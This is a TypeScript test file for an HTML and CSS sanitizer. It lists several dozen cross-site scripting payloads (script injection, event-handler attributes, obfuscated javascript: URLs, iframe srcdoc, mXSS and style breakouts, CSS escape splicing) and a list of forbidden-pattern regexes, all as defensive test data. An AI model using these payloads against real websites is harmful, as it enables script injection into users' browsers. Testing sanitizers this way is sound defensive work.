import { SEED_SITES } from '../seed/data/sites';
import { ALLOWED_TAGS, cleanCss, extractText, sanitizeSiteHtml } from './sanitizer';

/** Names of every tag (open or close) that appears in the markup, outside <style> bodies. */
function tagNames(html: string): string[] {
  const markup = html.replace(/<style[^>]*>[\s\S]*?<\/style>/gi, '<style></style>');
  return [...markup.matchAll(/<\/?([a-z][a-z0-9-]*)/gi)].map((m) => m[1].toLowerCase());
}

/** Each payload must come out with none of the dangerous parts. */
const PAYLOADS: Array<[name: string, html: string]> = [
  ['script tag', '<p>hi</p><script>alert(1)</script>'],
  ['script with src', '<script src="https://evil.example/x.js"></script>'],
  ['img onerror', '<img src=x onerror=alert(1)>'],
  ['svg onload', '<svg onload=alert(1)><circle/></svg>'],
  ['body onload', '<body onload="alert(1)"><p>x</p></body>'],
  ['div onclick', '<div onclick="alert(1)">click</div>'],
  ['onmouseover on anchor', '<a href="tidepool.zz" onmouseover="alert(1)">x</a>'],
  ['javascript url', '<a href="javascript:alert(1)">x</a>'],
  ['mixed-case javascript url', '<a href="JaVaScRiPt:alert(1)">x</a>'],
  ['entity-encoded javascript url', '<a href="&#106;avascript:alert(1)">x</a>'],
  ['tab-split javascript url', '<a href="java\tscript:alert(1)">x</a>'],
  ['data url', '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>'],
  ['vbscript url', '<a href="vbscript:msgbox(1)">x</a>'],
  ['iframe', '<iframe src="https://evil.example"></iframe>'],
  ['iframe srcdoc', '<iframe srcdoc="<script>alert(1)</script>"></iframe>'],
  ['object', '<object data="x.swf"></object>'],
  ['embed', '<embed src="x.swf">'],
  ['form', '<form action="https://evil.example"><input name=pw></form>'],
  ['base tag', '<base href="https://evil.example/">'],
  ['meta refresh', '<meta http-equiv="refresh" content="0;url=https://evil.example">'],
  ['link stylesheet', '<link rel="stylesheet" href="https://evil.example/x.css">'],
  ['nested script', '<scr<script>ipt>alert(1)</scr</script>ipt>'],
  ['style import', '<style>@import url(https://evil.example/x.css);</style>'],
  ['style url()', '<style>body{background:url(https://evil.example/p.png)}</style>'],
  ['style expression', '<div style="width:expression(alert(1))">x</div>'],
  ['style attr url', '<div style="background:url(javascript:alert(1))">x</div>'],
  ['style closing tag breakout', '<style>a{}</style><script>alert(1)</script>'],
  ['textarea script', '<textarea><script>alert(1)</script></textarea>'],
  ['noscript breakout', '<noscript><p title="</noscript><script>alert(1)</script>"></noscript>'],
  ['template', '<template><script>alert(1)</script></template>'],
  ['math/mxss', '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>'],
  ['target _top', '<a href="tidepool.zz" target="_top">x</a>'],
  ['window.top text', '<p>window.top.location="https://evil.example"</p><script>window.top.location="x"</script>'],
];

const FORBIDDEN = [
  /<script/i,
  /<iframe/i,
  /<object/i,
  /<embed/i,
  /<form/i,
  /<base\b/i,
  /<meta/i,
  /<link/i,
  /<svg/i,
  /<template/i,
  /\son\w+\s*=/i,
  /javascript:/i,
  /vbscript:/i,
  /data:text/i,
  /@import/i,
  /url\s*\(/i,
  /expression\s*\(/i,
  /target=/i,
  /srcdoc/i,
];

describe('sanitizeSiteHtml', () => {
  it.each(PAYLOADS)('neutralizes: %s', (_name, html) => {
    const out = sanitizeSiteHtml(html);
    // Inside <style> everything is raw CSS text, never markup, so inspect the markup outside it
    const markup = out.replace(/<style[^>]*>[\s\S]*?<\/style>/gi, '<style></style>');
    for (const bad of FORBIDDEN) expect(markup).not.toMatch(bad);
  });

  it.each(PAYLOADS)('leaves no way out of a <style> element: %s', (_name, html) => {
    const out = sanitizeSiteHtml(html);
    for (const m of out.matchAll(/<style[^>]*>([\s\S]*?)<\/style>/gi)) {
      expect(m[1]).not.toMatch(/[<\\]|url\s*\(|@import/i);
    }
  });

  describe('document-structure tags (a bare <body> used to survive with its attributes stripped)', () => {
    it('drops a stray <body onload> instead of leaving a bare <body> in the page', () => {
      const out = sanitizeSiteHtml('<body onload="alert(1)"><p>x</p></body>');
      expect(out).toBe('<p>x</p>');
    });

    it('unwraps a whole document, keeping the content and the styles', () => {
      const out = sanitizeSiteHtml(
        '<!doctype html><html lang="en" onclick="x"><head><title>Secret title</title><meta charset="utf-8"><style>p{color:red}</style></head><body class="a" style="position:fixed"><p>hi</p></body></html>',
      );
      expect(tagNames(out)).toEqual(['style', 'style', 'p', 'p']); // open + close counted by tagNames
      expect(out).toContain('<p>hi</p>');
      expect(out).toContain('p{color:red}');
      expect(out).not.toMatch(/<(html|head|body|title)\b/i);
      expect(out).not.toContain('Secret title'); // the title text must not leak into the page
    });

    it('drops <title> and <head> placed in the middle of the body', () => {
      const out = sanitizeSiteHtml('<p>a</p><title>sneaky</title><head><p>b</p></head><p>c</p>');
      expect(out).toBe('<p>a</p><p>b</p><p>c</p>');
    });

    it('cannot reach the frame root elements through attributes on stray html/body tags', () => {
      const out = sanitizeSiteHtml('<html class="x" id="y" style="background:red"><body id="z" class="w"><p>t</p></body></html>');
      expect(out).toBe('<p>t</p>');
    });

    it('only ever emits allowlisted tags, for every hostile payload and every seed page', () => {
      const allowed = new Set(ALLOWED_TAGS);
      const inputs = [...PAYLOADS.map(([, html]) => html), ...SEED_SITES.map((s) => s.html)];
      for (const html of inputs) {
        for (const tag of tagNames(sanitizeSiteHtml(html))) expect(allowed).toContain(tag);
      }
    });

    it('does not allow any of html, head, body or title', () => {
      for (const tag of ['html', 'head', 'body', 'title']) expect(ALLOWED_TAGS).not.toContain(tag);
    });
  });

  it('keeps ordinary prose, headings, lists, tables and plain links', () => {
    const out = sanitizeSiteHtml(
      '<h1>Title</h1><p>Some <em>prose</em> and a <a href="cartographers.zz">link</a>.</p><ul><li>one</li></ul><table><tr><td>cell</td></tr></table>',
    );
    expect(out).toContain('<h1>Title</h1>');
    expect(out).toContain('<em>prose</em>');
    expect(out).toContain('href="cartographers.zz"');
    expect(out).toContain('<li>one</li>');
    expect(out).toContain('<td>cell</td>');
  });

  it('keeps http(s) links (shown but never followed by the browser)', () => {
    expect(sanitizeSiteHtml('<a href="http://example.org/x">x</a>')).toContain('href="http://example.org/x"');
  });

  it('forces rel on every link and drops target', () => {
    const out = sanitizeSiteHtml('<a href="tidepool.zz" target="_blank">x</a>');
    expect(out).toContain('rel="noopener noreferrer nofollow"');
    expect(out).not.toContain('target');
  });

  it('keeps safe inline <style> but cannot reach for resources', () => {
    const out = sanitizeSiteHtml('<style>h1{color:red}</style><h1>x</h1>');
    expect(out).toContain('h1{color:red}');
  });

  it('turns position:fixed/sticky overlays into normal flow', () => {
    const out = sanitizeSiteHtml('<style>.cover{position:fixed;top:0;left:0;width:100vw;height:100vh}</style><div class="cover" style="position: sticky">x</div>');
    expect(out).not.toMatch(/position\s*:\s*(fixed|sticky)/i);
    expect(out).toContain('position:static');
  });

  it('copes with very long input', () => {
    const big = '<p>' + 'lorem ipsum '.repeat(8000) + '</p>';
    expect(sanitizeSiteHtml(big).length).toBeGreaterThan(90_000);
  });

  it('is stable: sanitizing twice changes nothing', () => {
    for (const [, html] of PAYLOADS) {
      const once = sanitizeSiteHtml(html);
      expect(sanitizeSiteHtml(once)).toBe(once);
    }
  });
});

describe('cleanCss', () => {
  it('removes url(), @import and fixed positioning', () => {
    const out = cleanCss('@import "x.css"; a{background:URL( x )} b{position:Fixed}');
    expect(out).not.toMatch(/@import|url\s*\(|position\s*:\s*fixed/i);
  });

  it('cannot be defeated by splicing: removal does not assemble a new token', () => {
    expect(cleanCss('a{background:uurl(rl(x)}')).not.toMatch(/url\s*\(/i);
    expect(cleanCss('@im@importport "x"')).not.toMatch(/@import/i);
    expect(cleanCss('b{position:posposition:fixedition:fixed}')).not.toMatch(/position\s*:\s*fixed/i);
  });

  it('cannot be defeated by CSS escapes', () => {
    expect(cleanCss('a{background:ur\\6c(x)}')).not.toMatch(/\\/);
    expect(cleanCss('a{background:u\\72l(x)}')).not.toMatch(/url\s*\(/i);
  });

  it('cannot close its own style element', () => {
    expect(cleanCss('a{}</style><script>alert(1)</script>')).not.toContain('<');
  });
});

describe('extractText', () => {
  it('returns visible prose only', () => {
    const text = extractText('<style>p{color:red}</style><h1>Tide</h1><p>Low &amp; slow <b>water</b></p><script>alert(1)</script>');
    expect(text).toBe('Tide Low & slow water');
  });
});
